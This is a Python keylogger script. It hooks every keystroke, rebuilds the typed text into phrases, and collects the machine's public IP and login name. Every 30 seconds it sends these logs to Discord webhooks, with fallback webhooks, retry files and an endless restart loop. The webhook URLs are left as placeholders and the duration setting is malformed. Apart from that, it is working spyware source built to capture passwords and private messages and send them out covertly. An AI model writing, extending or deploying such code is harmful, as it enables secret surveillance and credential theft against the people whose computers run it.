WEBHOOKS = [None, None]  # Placeholder for webhook URLs
import keyboard as kb
import time
import json
import requests
import threading
import os
from datetime import datetime, timedelta

LOG_DURATION = timedelta(minutes=None)

try:
    public_ip = requests.get('https://api.ipify.org').text
    login_name = os.getlogin()

    RETRY_FOLDER = "failed_logs"
    os.makedirs(RETRY_FOLDER, exist_ok=True)
    MAX_DISCORD_LENGTH = 1900  # Leave space for formatting
    PHRASE_PAUSE_THRESHOLD = 0.5

    lock = threading.Lock()
    collected_raw = ""
    collected_retyped = ""
    current_phrase = ""
    last_key_time = None
    error_log = ""  # To capture errors during the process

    def on_key(event):
        global collected_raw, collected_retyped, current_phrase, last_key_time

        now = datetime.now()
        name = event.name

        with lock:
            collected_raw += f"{now.strftime('%Y-%m-%d %H:%M:%S')} : {event}\n"

            if last_key_time:
                elapsed = (now - last_key_time).total_seconds()
                if elapsed > PHRASE_PAUSE_THRESHOLD and current_phrase:
                    collected_retyped += current_phrase + "\n"
                    current_phrase = ""

            if len(name) == 1:
                current_phrase += name
            elif name == "space":
                current_phrase += " "
            elif name == "enter":
                current_phrase += "\n"
            elif name == "backspace":
                current_phrase = current_phrase[:-1]

            last_key_time = now

    def send_to_discord(content, webhook_index=0):
        if webhook_index >= len(WEBHOOKS):
            return False

        webhook = WEBHOOKS[webhook_index]
        headers = {"Content-Type": "application/json"}
        payload = {"content": content}

        try:
            response = requests.post(webhook, headers=headers, data=json.dumps(payload), timeout=5)
            if response.status_code == 204:
                return True
            else:
                print(f"[!] Discord error {response.status_code}, retrying with backup webhook...")
                return send_to_discord(content, webhook_index + 1)
        except requests.exceptions.RequestException as e:
            global error_log
            error_log += f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Error: {str(e)}\n"
            print(f"[!] Network error: {e}, saving log to retry later.")
            return False

    def save_failed_log(content):
        filename = os.path.join(RETRY_FOLDER, f"failed_log_{int(time.time())}.txt")
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(content)

    def retry_failed_logs():
        for file in os.listdir(RETRY_FOLDER):
            filepath = os.path.join(RETRY_FOLDER, file)
            with open(filepath, 'r', encoding='utf-8') as f:
                content = f.read()
            if send_in_chunks(content):
                os.remove(filepath)

    def send_in_chunks(log_text):
        lines = log_text.splitlines()
        chunk = ""
        success = True
        for line in lines:
            if len(chunk) + len(line) + 1 > MAX_DISCORD_LENGTH:
                if not send_to_discord(chunk):
                    save_failed_log(chunk)
                    success = False
                chunk = ""
            chunk += line + "\n"

        if chunk:
            if not send_to_discord(chunk):
                save_failed_log(chunk)
                success = False

        return success

    def sender_thread_func():
        while True:
            time.sleep(30)
            retry_failed_logs()

            with lock:
                global collected_raw, collected_retyped, current_phrase, error_log
                full_log = f"""# -----------------------Keyboard Log-----------------------
    ## Client IP: {public_ip}
    ## Client Name: {login_name}
    ## Date: {datetime.now().date()}
    ## Time: {datetime.now().strftime('%H:%M:%S')}

    ### [Retyped / Interprété]
    {collected_retyped}{current_phrase}

    ### [Brut]
    {collected_raw}

    ### [Erreurs]
    {error_log}
    """
                if len(full_log.strip()) > 0:
                    send_in_chunks(full_log)
                    collected_raw = ""
                    collected_retyped = ""
                    current_phrase = ""
                    error_log = ""  # Clear error log after sending

    def keylogger_main():
        while True:  # Infinite loop to restart the process
            # Reset everything before starting a new logging session
            global collected_raw, collected_retyped, current_phrase, error_log
            collected_raw = ""
            collected_retyped = ""
            current_phrase = ""
            error_log = ""

            keyboard_thread = threading.Thread(target=sender_thread_func, daemon=True)
            keyboard_thread.start()

            kb.on_press(on_key)

            # Run for 10 minutes or until you decide to stop manually
            start_time = datetime.now()
            while datetime.now() - start_time < LOG_DURATION:
                time.sleep(0.1)

            # Final flush before exit
            with lock:
                final_log = f"""# -----------------------Keyboard Log-----------------------
    ## Date: {datetime.now().date()}
    ## Time: {datetime.now().strftime('%H:%M:%S')}

    ### [Retyped / Interprété]
    {collected_retyped}{current_phrase}

    ### [Brut]
    {collected_raw}

    ### [Erreurs]
    {error_log}
    """
            send_in_chunks(final_log)
            print("[INFO] 10 minutes elapsed, restarting the kl...")
            time.sleep(5)  # Small delay before restarting

    if __name__ == "__main__":
        keylogger_main()
except Exception as e:
    error_log_msg = f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Fatal error: {str(e)}\n"
    with open("error_log.txt", "a", encoding="utf-8") as f:
        f.write(error_log_msg)
    exit()